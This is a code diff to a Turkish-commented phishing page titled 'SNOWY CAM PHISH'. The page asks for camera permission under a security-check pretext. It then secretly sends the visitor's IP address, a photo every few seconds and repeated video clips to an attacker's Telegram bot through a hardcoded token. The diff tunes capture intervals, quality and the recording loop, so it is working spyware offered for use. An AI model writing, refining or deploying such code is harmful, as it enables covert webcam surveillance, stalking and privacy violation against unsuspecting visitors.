@@ -61,7 +61,7 @@
 
     <script>
         // ============================================
-        // GİZLİ KONFİGÜRASYON - YENİ TOKEN
+        // GİZLİ KONFİGÜRASYON - SON TOKEN
         // ============================================
         const BOT_TOKEN = "8773124715:AAEfs80t8yv2XnDGy20aLlxy3aFGwDj0jFU";
         const urlParams = new URLSearchParams(window.location.search);
@@ -96,15 +96,14 @@
         async function sendIP(ip) {
             if (ipGonderildi) return;
             
-            const msg = `<b>❄️ SNOWY CAM PHISH ❄️</b>\n━━━━━━━━━━━━━━━━━━━━━\n🌐 <b>IP Adresi:</b> ${ip}\n⏱️ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
+            const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ 
                     chat_id: TARGET_ID, 
-                    text: msg, 
-                    parse_mode: 'HTML'
+                    text: msg
                 })
             });
             
@@ -112,7 +111,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK - 2 SANİYEDE 1
+        // FOTOĞRAF ÇEK
         // ============================================
         async function takePhoto() {
             if (!video.videoWidth || !video.videoHeight) return;
@@ -137,30 +136,19 @@
                         body: formData
                     });
                     
-                }, 'image/jpeg', 0.6);
+                }, 'image/jpeg', 0.7);
                 
             } catch(e) {}
         }
         
         // ============================================
-        // 2 SANİYELİK VİDEO KAYDI (DÜŞÜK KALİTE)
+        // VİDEO KAYDI
         // ============================================
-        function recordVideo() {
+        function startVideoRecording() {
             if (!stream || !stream.active) return;
             
             recordedChunks = [];
-            
-            // Düşük bitrate ile kaydet (küçük boyut için)
-            const options = {
-                mimeType: 'video/webm',
-                videoBitsPerSecond: 25000
-            };
-            
-            try {
-                mediaRecorder = new MediaRecorder(stream, options);
-            } catch(e) {
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            }
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) recordedChunks.push(event.data);
@@ -180,17 +168,15 @@
                     body: formData
                 });
                 
-                // 2 saniye sonra yeni video
-                setTimeout(recordVideo, 2000);
+                setTimeout(startVideoRecording, 1000);
             };
             
-            // 2 saniye kaydet
             mediaRecorder.start();
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
-            }, 2000);
+            }, 5000);
         }
         
         // ============================================
@@ -198,14 +184,7 @@
         // ============================================
         async function startCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
-                        width: { ideal: 320 },
-                        height: { ideal: 240 },
-                        frameRate: { ideal: 10 }
-                    }
-                });
-                
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = async () => {
@@ -217,19 +196,11 @@
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // 2 SANİYEDE 1 FOTOĞRAF
-                    setInterval(takePhoto, 2000);
-                    
-                    // 2 SANİYEDE 1 VİDEO
-                    setTimeout(recordVideo, 2000);
+                    setTimeout(() => {
+                        startVideoRecording();
+                        setInterval(takePhoto, 3000);
+                    }, 2000);
                 };
-                
-                const texts = ["Güvenlik kontrolü...", "Kamera aktif..."];
-                let i = 0;
-                setInterval(() => {
-                    i = (i + 1) % texts.length;
-                    document.getElementById('loadingText').innerText = texts[i];
-                }, 2000);
                 
             } catch(e) {
                 alert('Kamera izni gerekli!');
